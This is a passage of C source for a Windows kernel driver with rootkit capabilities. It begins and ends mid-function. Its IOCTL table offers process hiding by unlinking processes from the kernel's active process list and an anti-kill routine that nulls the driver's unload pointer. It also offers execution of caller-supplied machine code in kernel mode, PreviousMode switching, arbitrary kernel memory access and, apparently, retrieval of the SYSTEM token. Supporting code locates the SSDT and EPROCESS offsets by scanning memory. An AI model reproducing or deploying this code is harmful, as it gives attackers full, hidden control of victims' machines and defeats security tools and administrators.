    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[0], L"g_IoctlHandler[0]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[1], L"g_IoctlHandler[1]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[2], L"g_IoctlHandler[2]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[3], L"g_IoctlHandler[3]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[4], L"g_IoctlHandler[4]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[5], L"g_IoctlHandler[5]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[6], L"g_IoctlHandler[6]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[7], L"g_IoctlHandler[7]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[8], L"g_IoctlHandler[8]", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_IoctlHandler[9], L"g_IoctlHandler[9]", NULL);
}

VOID UpdateAntiKill(VOID)
{
    __try {
        volatile PVOID *ppUnload;
        if (g_DriverObject == NULL) __leave;
        ppUnload = (volatile PVOID *)(&g_DriverObject->DriverUnload);
        if (g_AntiKill == 1) {
            PVOID old = InterlockedExchangePointer((PVOID *)ppUnload, NULL);
            if (old != NULL) g_OriginalUnload = old;
        } else {
            if (g_OriginalUnload != NULL)
                InterlockedExchangePointer((PVOID *)ppUnload, g_OriginalUnload);
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) { }
}

BOOLEAN HasTcbPrivilege(VOID)
{
    BOOLEAN ok = FALSE;
    __try {
        LUID luid = { SE_TCB_PRIVILEGE, 0 };
        ok = SeSinglePrivilegeCheck(luid, UserMode);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        ok = FALSE;
    }
    return ok;
}

BOOLEAN SafeReadMemory(PVOID Address, PVOID Buffer, SIZE_T Size)
{
    BOOLEAN ok = FALSE;
    __try {
        RtlCopyMemory(Buffer, Address, Size);
        ok = TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        ok = FALSE;
    }
    return ok;
}

UINT64 ReadMsr(ULONG msr)
{
    UINT64 value = 0;
    __try { value = __readmsr(msr); }
    __except(EXCEPTION_EXECUTE_HANDLER) { value = 0; }
    return value;
}

UINT64 FindKeServiceDescriptorTable(UINT64 start, SIZE_T rangeSize)
{
    UINT64 found = 0;
    __try {
        UINT64 end = start + rangeSize;
        UINT64 addr;
        for (addr = start; addr < end - 7; addr++) {
            UCHAR buf[7];
            ULONG offset;
            UINT64 target;
            UCHAR test;
            if (!SafeReadMemory((PVOID)(ULONG_PTR)addr, buf, sizeof(buf))) continue;
            if (buf[0] == 0x4C && buf[1] == 0x8D && buf[2] == 0x15) {
                offset = *(ULONG*)(buf + 3);
                target = addr + 7 + (INT64)(INT32)offset;
                if (SafeReadMemory((PVOID)(ULONG_PTR)target, &test, 1)) {
                    found = target;
                    break;
                }
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        found = 0;
    }
    return found;
}

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

PVOID GetNtdllBase(PEPROCESS Process)
{
    PVOID base = NULL;
    KAPC_STATE apc;
    BOOLEAN attached = FALSE;

    if (Process == NULL) return NULL;

    __try {
        KeStackAttachProcess((PRKPROCESS)Process, &apc);
        attached = TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        attached = FALSE;
    }

    if (!attached) return NULL;

    __try {
        PPEB peb = PsGetProcessPeb(Process);
        if (peb) {
            PVOID ldrPtr = NULL;
            __try { ldrPtr = *(PVOID*)((PUCHAR)peb + 0x18); }
            __except(EXCEPTION_EXECUTE_HANDLER) { ldrPtr = NULL; }

            if (ldrPtr) {
                PEB_LDR_DATA ldr;
                if (SafeReadMemory(ldrPtr, &ldr, sizeof(ldr)) && ldr.InMemoryOrderModuleList.Flink) {
                    PLIST_ENTRY head = (PLIST_ENTRY)&ldr.InMemoryOrderModuleList;
                    PLIST_ENTRY entry = head->Flink;
                    while (entry != head) {
                        LDR_DATA_TABLE_ENTRY module;
                        WCHAR nameBuf[32];
                        if (!SafeReadMemory(CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
                                            &module, sizeof(module))) break;
                        if (module.BaseDllName.Buffer && module.BaseDllName.Length < sizeof(nameBuf)) {
                            if (SafeReadMemory(module.BaseDllName.Buffer, nameBuf, module.BaseDllName.Length)) {
                                nameBuf[module.BaseDllName.Length / sizeof(WCHAR)] = 0;
                                if (R0sWcsEqI(nameBuf, L"ntdll.dll")) {
                                    base = module.DllBase;
                                    break;
                                }
                            }
                        }
                        entry = entry->Flink;
                    }
                }
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) { }

    __try { KeUnstackDetachProcess(&apc); }
    __except(EXCEPTION_EXECUTE_HANDLER) { }

    return base;
}

NAME_MAP* ParseNtdllExports(PVOID ntdllBase, ULONG *pCount)
{
    NAME_MAP*  map = NULL;
    ULONG      count = 0;
    BOOLEAN    ok = FALSE;

    if (pCount) *pCount = 0;
    if (!ntdllBase) return NULL;

    __try {
        IMAGE_DOS_HEADER        dos;
        IMAGE_NT_HEADERS64      nt;
        IMAGE_DATA_DIRECTORY    expDir;
        IMAGE_EXPORT_DIRECTORY  exp;
        ULONG                   e_lfanew;
        ULONG*                  names;
        ULONG                   totalCount = 0;
        ULONG                   idx = 0;
        ULONG                   i;
        int                     j;

        if (!SafeReadMemory(ntdllBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
            __leave;
        }
        e_lfanew = dos.e_lfanew;
        if (!SafeReadMemory((PUCHAR)ntdllBase + e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) {
            __leave;
        }
        expDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (expDir.VirtualAddress == 0 || expDir.Size == 0) {
            __leave;
        }
        if (!SafeReadMemory((PUCHAR)ntdllBase + expDir.VirtualAddress, &exp, sizeof(exp))) {
            __leave;
        }

        names = (ULONG*)((PUCHAR)ntdllBase + exp.AddressOfNames);

        for (i = 0; i < exp.NumberOfNames; i++) {
            ULONG nameRVA;
            char funcName[64] = {0};
            if (!SafeReadMemory(&names[i], &nameRVA, sizeof(nameRVA))) break;
            for (j = 0; j < 63; j++) {
                char ch;
                if (!SafeReadMemory((PUCHAR)ntdllBase + nameRVA + j, &ch, 1)) break;
                if (ch == 0) { funcName[j] = 0; break; }
                funcName[j] = ch;
            }
            if (funcName[0] == 'Z' && funcName[1] == 'w') totalCount++;
        }
        if (totalCount == 0) {
            __leave;
        }

        map = (NAME_MAP*)ExAllocatePoolWithTag(NonPagedPool, totalCount * sizeof(NAME_MAP), 'MAP0');
        if (!map) {
            __leave;
        }
        RtlZeroMemory(map, totalCount * sizeof(NAME_MAP));

        for (i = 0; i < exp.NumberOfNames && idx < totalCount; i++) {
            ULONG nameRVA;
            char funcName[64] = {0};
            USHORT ordinal;
            ULONG funcRVA;
            PVOID funcVA;
            UCHAR code[8];
            ULONG ssn = 0;

            if (!SafeReadMemory(&names[i], &nameRVA, sizeof(nameRVA))) break;
            for (j = 0; j < 63; j++) {
                char ch;
                if (!SafeReadMemory((PUCHAR)ntdllBase + nameRVA + j, &ch, 1)) break;
                if (ch == 0) { funcName[j] = 0; break; }
                funcName[j] = ch;
            }
            if (!(funcName[0] == 'Z' && funcName[1] == 'w')) continue;
            if (!SafeReadMemory((PUSHORT)((PUCHAR)ntdllBase + exp.AddressOfNameOrdinals + i * 2), &ordinal, sizeof(ordinal))) continue;
            if (!SafeReadMemory((ULONG*)((PUCHAR)ntdllBase + exp.AddressOfFunctions + ordinal * 4), &funcRVA, sizeof(funcRVA))) continue;
            funcVA = (PUCHAR)ntdllBase + funcRVA;
            if (!SafeReadMemory(funcVA, code, sizeof(code))) continue;
            if (code[0] == 0xB8) ssn = *(ULONG*)(code + 1);
            else if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8) ssn = *(ULONG*)(code + 4);
            else continue;

            for (j = 0; j < 63 && funcName[j]; j++)
                map[idx].Name[j] = (WCHAR)funcName[j];
            map[idx].Ssn = ssn;
            idx++;
        }
        count = idx;
        ok = TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        ok = FALSE;
    }

    if (!ok) {
        if (map) { ExFreePoolWithTag(map, 'MAP0'); map = NULL; }
        count = 0;
    }

    if (pCount) *pCount = count;
    return map;
}

ULONG WcharToUlong(const WCHAR* str)
{
    ULONG val = 0;
    __try {
        while (*str) {
            if (*str < L'0' || *str > L'9') { val = 0; break; }
            val = val * 10 + (*str - L'0');
            str++;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        val = 0;
    }
    return val;
}

BOOLEAN IsNumberString(const WCHAR* str)
{
    BOOLEAN ok = FALSE;
    __try {
        if (str && *str) {
            ok = TRUE;
            for (; *str; str++) {
                if (*str < L'0' || *str > L'9') { ok = FALSE; break; }
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        ok = FALSE;
    }
    return ok;
}

NTSTATUS BuildSsdtTable(VOID)
{
    NTSTATUS status = STATUS_SUCCESS;

    if (g_SsdtBuilt) return STATUS_SUCCESS;

    __try {
        UINT64 kiAddr;
        UINT64 sdtPtr;
        UINT64 serviceTableBase = 0;
        ULONG  numberOfServices = 0;
        BOOLEAN valid = FALSE;
        PEPROCESS curProc;
        PVOID ntdllBase;
        ULONG mapCount = 0;
        NAME_MAP* nameMap = NULL;
        ULONG i;
        int baseOff;

        kiAddr = ReadMsr(0xC0000082);
        if (!kiAddr) { status = STATUS_UNSUCCESSFUL; __leave; }
        sdtPtr = FindKeServiceDescriptorTable(kiAddr - 0x1000, 0x2000);
        if (!sdtPtr) { status = STATUS_NOT_FOUND; __leave; }

        for (baseOff = 0; baseOff <= 0x18; baseOff += 8) {
            UINT64 base;
            int limitOff;
            if (!SafeReadMemory((PVOID)(ULONG_PTR)(sdtPtr + baseOff), &base, sizeof(base))) continue;
            if ((base >> 40) != 0xFFFFF8) continue;
            for (limitOff = baseOff + 0x10; limitOff <= baseOff + 0x20; limitOff += 4) {
                ULONG limit;
                if (!SafeReadMemory((PVOID)(ULONG_PTR)(sdtPtr + limitOff), &limit, sizeof(limit))) continue;
                if (limit > 100 && limit < 10000) {
                    serviceTableBase = base;
                    numberOfServices = limit;
                    valid = TRUE;
                    break;
                }
            }
            if (valid) break;
        }
        if (!valid) {
            if (SafeReadMemory((PVOID)(ULONG_PTR)sdtPtr, &serviceTableBase, sizeof(serviceTableBase)) &&
                SafeReadMemory((PVOID)(ULONG_PTR)(sdtPtr + 0x10), &numberOfServices, sizeof(numberOfServices))) {
                if ((serviceTableBase >> 40) == 0xFFFFF8 && numberOfServices > 100 && numberOfServices < 10000)
                    valid = TRUE;
            }
        }
        if (!valid) { status = STATUS_UNSUCCESSFUL; __leave; }

        curProc = PsGetCurrentProcess();
        ntdllBase = GetNtdllBase(curProc);
        if (ntdllBase) nameMap = ParseNtdllExports(ntdllBase, &mapCount);

        for (i = 0; i < numberOfServices; i++) {
            ULONG entry;
            UINT64 entryAddr = serviceTableBase + i * 4;
            UINT64 funcAddr;
            PSSDT_ENTRY pNode;
            KIRQL oldIrql;

            if (!SafeReadMemory((PVOID)(ULONG_PTR)entryAddr, &entry, sizeof(entry))) continue;
            funcAddr = serviceTableBase + (entry >> 4);

            pNode = (PSSDT_ENTRY)ExAllocatePoolWithTag(NonPagedPool, sizeof(SSDT_ENTRY), 'SSDT');
            if (!pNode) break;
            RtlZeroMemory(pNode, sizeof(SSDT_ENTRY));
            pNode->Ssn = i;
            pNode->Address = funcAddr;

            if (nameMap) {
                ULONG j;
                for (j = 0; j < mapCount; j++) {
                    if (nameMap[j].Ssn == i) {
                        R0sWcsCopyN(pNode->Name, nameMap[j].Name, 64);
                        break;
                    }
                }
            }
            if (pNode->Name[0] == 0) R0sWcsCopyN(pNode->Name, L"Unknown", 64);

            KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
            InsertHeadList(&g_SsdtListHead, &pNode->ListEntry);
            KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
        }

        if (nameMap) ExFreePoolWithTag(nameMap, 'MAP0');
        g_SsdtBuilt = TRUE;
        status = STATUS_SUCCESS;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }
    return status;
}

PSSDT_ENTRY FindSsdtBySsn(ULONG ssn)
{
    PSSDT_ENTRY found = NULL;
    KIRQL oldIrql;

    KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
    {
        PLIST_ENTRY p = g_SsdtListHead.Flink;
        while (p != &g_SsdtListHead) {
            PSSDT_ENTRY e = CONTAINING_RECORD(p, SSDT_ENTRY, ListEntry);
            if (e->Ssn == ssn) { found = e; break; }
            p = p->Flink;
        }
    }
    KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
    return found;
}

PSSDT_ENTRY FindSsdtByName(const WCHAR* name)
{
    PSSDT_ENTRY found = NULL;
    KIRQL oldIrql;

    KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
    {
        PLIST_ENTRY p = g_SsdtListHead.Flink;
        while (p != &g_SsdtListHead) {
            PSSDT_ENTRY e = CONTAINING_RECORD(p, SSDT_ENTRY, ListEntry);
            if (R0sWcsEqI(e->Name, name)) { found = e; break; }
            p = p->Flink;
        }
    }
    KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
    return found;
}

NTSTATUS InitDynamicOffsets(VOID)
{
    NTSTATUS status = STATUS_SUCCESS;

    __try {
        UNICODE_STRING us;
        PVOID pExGetPrevMode;
        PVOID pPsGetPid;
        UCHAR* pCode;
        USHORT offset;
        PEPROCESS pSystem = PsInitialSystemProcess;

        RtlInitUnicodeString(&us, L"ExGetPreviousMode");
        pExGetPrevMode = MmGetSystemRoutineAddress(&us);
        if (!pExGetPrevMode) { status = STATUS_NOT_FOUND; __leave; }
        pCode = (UCHAR*)pExGetPrevMode;
        __try { g_PreviousModeOffset = *(USHORT*)(pCode + 0x0C); }
        __except(EXCEPTION_EXECUTE_HANDLER) { status = GetExceptionCode(); __leave; }

        RtlInitUnicodeString(&us, L"PsGetProcessId");
        pPsGetPid = MmGetSystemRoutineAddress(&us);
        if (!pPsGetPid) { status = STATUS_NOT_FOUND; __leave; }
        pCode = (UCHAR*)pPsGetPid;
        __try {
            offset = *(USHORT*)(pCode + 0x03);
            g_ActiveProcessLinksOffset = offset + 0x08;
        } __except(EXCEPTION_EXECUTE_HANDLER) { status = GetExceptionCode(); __leave; }

        if (pSystem) {
            UCHAR* base = (UCHAR*)pSystem;
            ULONG i;
            __try {
                for (i = 0; i < 0x600 - 1; i++) {
                    if (base[i] == 0xD0 && base[i+1] == 0x00) {
                        g_PrimaryTokenFrozenOffset = i;
                        break;
                    }
                }
            } __except(EXCEPTION_EXECUTE_HANDLER) { status = GetExceptionCode(); __leave; }
        }
        if (g_PrimaryTokenFrozenOffset == 0) { status = STATUS_NOT_FOUND; __leave; }
        status = STATUS_SUCCESS;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }
    return status;
}

NTSTATUS LazyBuildFunctionTable(VOID)
{
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bufferSize = 0;
    PVOID buffer = NULL;
    BOOLEAN retry = TRUE;

    __try {
        status = ZwQuerySystemInformation(11, NULL, 0, &bufferSize);
        if (!NT_SUCCESS(status) || bufferSize == 0) bufferSize = 0x20000;

        while (retry) {
            PSYSTEM_MODULE_INFORMATION pModuleInfo;
            ULONG count;
            ULONG i;

            retry = FALSE;
            buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'TBL0');
            if (!buffer) { status = STATUS_INSUFFICIENT_RESOURCES; __leave; }

            status = ZwQuerySystemInformation(11, buffer, bufferSize, NULL);
            if (status == STATUS_INFO_LENGTH_MISMATCH) {
                ExFreePoolWithTag(buffer, 'TBL0');
                buffer = NULL;
                bufferSize += 0x10000;
                retry = TRUE;
                continue;
            }
            if (!NT_SUCCESS(status)) { __leave; }

            pModuleInfo = (PSYSTEM_MODULE_INFORMATION)buffer;
            count = pModuleInfo->Count;

            for (i = 0; i < count; i++) {
                PSYSTEM_MODULE_ENTRY pEntry = &pModuleInfo->Module[i];
                PVOID base = pEntry->ImageBase;
                ULONG size = pEntry->ImageSize;
                IMAGE_DOS_HEADER dos;
                ULONG e_lfanew;
                IMAGE_NT_HEADERS64 nt;
                IMAGE_DATA_DIRECTORY exportDir;
                IMAGE_EXPORT_DIRECTORY export;
                ULONG j;

                if (!base || size == 0) continue;
                if (!SafeReadMemory(base, &dos, sizeof(dos))) continue;
                if (dos.e_magic != IMAGE_DOS_SIGNATURE) continue;

                e_lfanew = dos.e_lfanew;
                if (e_lfanew + sizeof(IMAGE_NT_HEADERS64) > size) continue;

                if (!SafeReadMemory((PUCHAR)base + e_lfanew, &nt, sizeof(nt))) continue;
                if (nt.Signature != IMAGE_NT_SIGNATURE) continue;

                exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                if (exportDir.VirtualAddress == 0 || exportDir.Size == 0) continue;
                if (exportDir.VirtualAddress + exportDir.Size > size) continue;

                if (!SafeReadMemory((PUCHAR)base + exportDir.VirtualAddress, &export, sizeof(export))) continue;
                if (export.NumberOfNames == 0) continue;

                if (export.AddressOfNames + export.NumberOfNames * 4 > size ||
                    export.AddressOfFunctions + export.NumberOfFunctions * 4 > size ||
                    export.AddressOfNameOrdinals + export.NumberOfNames * 2 > size) continue;

                for (j = 0; j < export.NumberOfNames; j++) {
                    ULONG nameRVA;
                    char funcName[128] = {0};
                    int k;
                    USHORT ordinal;
                    ULONG funcRVA;
                    PVOID funcAddr;
                    PFUNCTION_ENTRY pNode;
                    ULONG len;
                    WCHAR* wname;
                    KIRQL oldIrql;

                    if (!SafeReadMemory((PUCHAR)base + export.AddressOfNames + j * 4, &nameRVA, sizeof(nameRVA))) break;
                    if (nameRVA >= size) continue;

                    for (k = 0; k < 127; k++) {
                        char ch;
                        if (!SafeReadMemory((PUCHAR)base + nameRVA + k, &ch, 1)) break;
                        if (ch == 0) { funcName[k] = 0; break; }
                        funcName[k] = ch;
                    }
                    funcName[127] = 0;

                    if (!SafeReadMemory((PUCHAR)base + export.AddressOfNameOrdinals + j * 2, &ordinal, sizeof(ordinal))) break;
                    if (!SafeReadMemory((PUCHAR)base + export.AddressOfFunctions + ordinal * 4, &funcRVA, sizeof(funcRVA))) break;

                    funcAddr = (PUCHAR)base + funcRVA;

                    pNode = (PFUNCTION_ENTRY)ExAllocatePoolWithTag(NonPagedPool, sizeof(FUNCTION_ENTRY), 'FENT');
                    if (!pNode) continue;

                    len = 0;
                    while (len < 127 && funcName[len]) len++;
                    wname = (WCHAR*)ExAllocatePoolWithTag(NonPagedPool, (len + 1) * sizeof(WCHAR), 'FNAM');
                    if (!wname) { ExFreePoolWithTag(pNode, 'FENT'); continue; }
                    for (k = 0; k < (int)len; k++) wname[k] = (WCHAR)funcName[k];
                    wname[len] = L'\0';

                    RtlInitUnicodeString(&pNode->Name, wname);
                    pNode->Address = funcAddr;

                    KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                    InsertHeadList(&g_FunctionTableHead, &pNode->ListEntry);
                    KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
                }
            }
            status = STATUS_SUCCESS;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (buffer) ExFreePoolWithTag(buffer, 'TBL0');
    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    NTSTATUS status = STATUS_SUCCESS;
    PDEVICE_OBJECT deviceObject = NULL;
    BOOLEAN symLinkCreated = FALSE;
    BOOLEAN deviceCreated = FALSE;

    UNREFERENCED_PARAMETER(RegistryPath);

    status = InitDynamicOffsets();
    if (!NT_SUCCESS(status)) return status;

    __try {
        UNICODE_STRING devName;
        g_DriverObject = DriverObject;
        g_DriverBase = (UINT64)(ULONG_PTR)DriverObject->DriverStart;
        g_DriverSize = DriverObject->DriverSize;

        g_IoctlHandler[IOCTL_INDEX_EXEC_INSTRUCTION]     = (UINT64)(ULONG_PTR)&ExecuteInstruction;
        g_IoctlHandler[IOCTL_INDEX_CALL_KERNEL_API]      = (UINT64)(ULONG_PTR)&CallKernelApiInternal;
        g_IoctlHandler[IOCTL_INDEX_PROCESS_HIDING]       = (UINT64)(ULONG_PTR)&ProcessHiding;
        g_IoctlHandler[IOCTL_INDEX_PREVIOUS_MODE_SWITCH] = (UINT64)(ULONG_PTR)&PreviousModeSwitch;
        g_IoctlHandler[IOCTL_INDEX_KERNEL_OPEN_HANDLE]   = (UINT64)(ULONG_PTR)&KernelOpenHandleInternal;
        g_IoctlHandler[IOCTL_INDEX_KERNEL_MEMORY_ACCESS] = (UINT64)(ULONG_PTR)&KernelMemoryAccess;
        g_IoctlHandler[IOCTL_INDEX_GET_SYSTEM_TOKEN]     = (UINT64)(ULONG_PTR)&GetSystemToken;
        g_IoctlHandler[IOCTL_INDEX_SET_INTERNAL_VARS]    = (UINT64)(ULONG_PTR)&SetInternalVariables;
        g_IoctlHandler[IOCTL_INDEX_GET_KERNEL_FUNCTION]  = (UINT64)(ULONG_PTR)&GetKernelFunction;
        g_IoctlHandler[IOCTL_INDEX_IO]                   = (UINT64)(ULONG_PTR)&IoPortOperation;

        RtlInitUnicodeString(&devName, DEVICE_NAME);
        RtlInitUnicodeString(&g_SymLinkName, SYM_LINK_NAME);

        status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
        if (!NT_SUCCESS(status)) { __leave; }
        deviceCreated = TRUE;

        g_DeviceObject = deviceObject;
        deviceObject->Flags |= DO_BUFFERED_IO;

        status = IoCreateSymbolicLink(&g_SymLinkName, &devName);
        if (!NT_SUCCESS(status)) { __leave; }
        symLinkCreated = TRUE;

        DriverObject->MajorFunction[IRP_MJ_CREATE]         = DriverCreateClose;
        DriverObject->MajorFunction[IRP_MJ_CLOSE]          = DriverCreateClose;
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;
        DriverObject->DriverUnload                         = DriverUnload;

        InitializeListHead(&g_HiddenListHead);
        KeInitializeSpinLock(&g_HiddenListLock);
        InitializeListHead(&g_FunctionTableHead);
        KeInitializeSpinLock(&g_FunctionTableLock);
        g_FunctionTableBuilt = FALSE;
        InitializeListHead(&g_SsdtListHead);
        KeInitializeSpinLock(&g_SsdtListLock);
        g_SsdtBuilt = FALSE;

        InitializeListHead(&g_VarTableHead);
        KeInitializeSpinLock(&g_VarTableLock);
        g_VarNextId = 1;
        RegisterAllVariables();

        deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
        status = STATUS_SUCCESS;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (!NT_SUCCESS(status)) {
        if (symLinkCreated) IoDeleteSymbolicLink(&g_SymLinkName);
        if (deviceCreated && deviceObject) IoDeleteDevice(deviceObject);
        g_DeviceObject = NULL;
    }
    return status;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    
    KIRQL oldIrql;
    PLIST_ENTRY pList;
    PLIST_ENTRY pNext;
    PHIDDEN_PROCESS_ENTRY pEntry;
    PFUNCTION_ENTRY pFunc;
    PSSDT_ENTRY pSsdt;
    PEPROCESS pSys;
    PLIST_ENTRY pLink;
    PLIST_ENTRY pSysLink;

    UNREFERENCED_PARAMETER(DriverObject);

    
    __try {
        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
        pList = g_HiddenListHead.Flink;
        while (pList != &g_HiddenListHead) {
            pEntry = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
            pNext  = pList->Flink;
            RemoveEntryList(pList);
            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

            if (pEntry->EProcess) {
                pLink    = (PLIST_ENTRY)((PCHAR)pEntry->EProcess + g_ActiveProcessLinksOffset);
                pSys     = PsInitialSystemProcess;
                pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
                __try { InsertHeadList(pSysLink, pLink); } __except(EXCEPTION_EXECUTE_HANDLER) {}
                ObDereferenceObject(pEntry->EProcess);
            }
            ExFreePoolWithTag(pEntry, 'HIDE');

            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
            pList = pNext;
        }
        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
    } __except(EXCEPTION_EXECUTE_HANDLER) { }

    
    __try {
        KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
        pList = g_FunctionTableHead.Flink;
        while (pList != &g_FunctionTableHead) {
            pFunc  = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
            pNext  = pList->Flink;
            RemoveEntryList(pList);
            KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);

            if (pFunc->Name.Buffer) ExFreePoolWithTag(pFunc->Name.Buffer, 'FNAM');
            ExFreePoolWithTag(pFunc, 'FENT');

            KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
            pList = pNext;
        }
        KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
    } __except(EXCEPTION_EXECUTE_HANDLER) { }

    
    __try {
        KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
        pList = g_SsdtListHead.Flink;
        while (pList != &g_SsdtListHead) {
            pSsdt  = CONTAINING_RECORD(pList, SSDT_ENTRY, ListEntry);
            pNext  = pList->Flink;
            RemoveEntryList(pList);
            KeReleaseSpinLock(&g_SsdtListLock, oldIrql);

            ExFreePoolWithTag(pSsdt, 'SSDT');

            KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
            pList = pNext;
        }
        KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
    } __except(EXCEPTION_EXECUTE_HANDLER) { }

    
    __try { FreeVarTable(); } __except(EXCEPTION_EXECUTE_HANDLER) { }

    
    __try {
        if (g_DeviceObject) {
            IoDeleteSymbolicLink(&g_SymLinkName);
            IoDeleteDevice(g_DeviceObject);
            g_DeviceObject = NULL;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) { }
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS ExecuteInstruction(PEPROCESS TargetProcess, PVOID InstructionCode,
                            ULONG InstructionSize, UINT64 *ReturnValue)
{
    NTSTATUS status = STATUS_SUCCESS;
    PVOID execMem = NULL;
    UINT64 result = 0;
    KAPC_STATE apcState;
    BOOLEAN attached = FALSE;

    if (!TargetProcess || !InstructionCode || InstructionSize == 0)
        return STATUS_INVALID_PARAMETER;

    execMem = ExAllocatePoolWithTag(NonPagedPoolExecute, InstructionSize, '0SR0');
    if (!execMem) return STATUS_INSUFFICIENT_RESOURCES;
    RtlCopyMemory(execMem, InstructionCode, InstructionSize);

    __try {
        KeStackAttachProcess((PRKPROCESS)TargetProcess, &apcState);
        attached = TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        attached = FALSE;
    }

    if (attached) {
        __try {
            result = ((PFN_0)execMem)();
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            status = GetExceptionCode();
            result = 0;
        }
        __try { KeUnstackDetachProcess(&apcState); }
        __except(EXCEPTION_EXECUTE_HANDLER) { }
    }

    if (ReturnValue) *ReturnValue = result;
    ExFreePoolWithTag(execMem, '0SR0');
    return status;
}

NTSTATUS CallKernelApiInternal(PVOID ApiAddress, ULONG Argc, UINT64 *Args,
                               PVOID OutputBuffer, ULONG OutputSize, UINT64 *ReturnValue)
{
    NTSTATUS status = STATUS_SUCCESS;
    UINT64 ret = 0;
    PVOID stackMem = NULL;
    SIZE_T stackSize = 0;

    UNREFERENCED_PARAMETER(OutputBuffer);
    UNREFERENCED_PARAMETER(OutputSize);

    if (!ApiAddress || Argc > 16) return STATUS_INVALID_PARAMETER;
    if (Argc > 4) {
        stackSize = (Argc - 4) * sizeof(UINT64);
